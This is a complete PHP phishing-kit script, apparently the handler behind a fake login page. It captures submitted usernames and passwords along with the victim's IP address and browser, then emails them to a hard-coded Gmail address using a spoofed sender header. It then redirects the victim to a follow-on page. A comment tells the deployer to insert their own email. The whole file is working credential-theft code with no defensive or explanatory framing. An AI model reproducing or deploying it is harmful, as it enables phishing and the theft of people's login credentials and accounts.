<?php
session_start();
$message  = "[ - ] ==================| -- |================== [ - ]\n";
$message .= "[+]User:       ".$_POST['username']."\n";
$message .= "[+]Pass:       ".$_POST['password']."\n";
$message .= "[+]IP:         ".$_SERVER['REMOTE_ADDR']."\n";
$message .= "[+]Browser:    ".$_SERVER['HTTP_USER_AGENT']."\n";
$message .= "[ - ] ==================| Card |================== [ - ]\n";
$praga=rand();
$praga=md5($praga);
$pra = rand(1111111111,9999999999);
if(!empty($_POST['username'])){
$send = "fnbcomz@gmail.com";   //<--------Your email there
$subject = $pra." - ATL - [".$_POST['username']."]";
$headers = "From: SB0".$pra."<bursted@".$pra."0sb.com>";
mail($send,$subject,$message,$headers);
header("Location: index2.php");
}else{
header("Location: index.php");
}	 
?>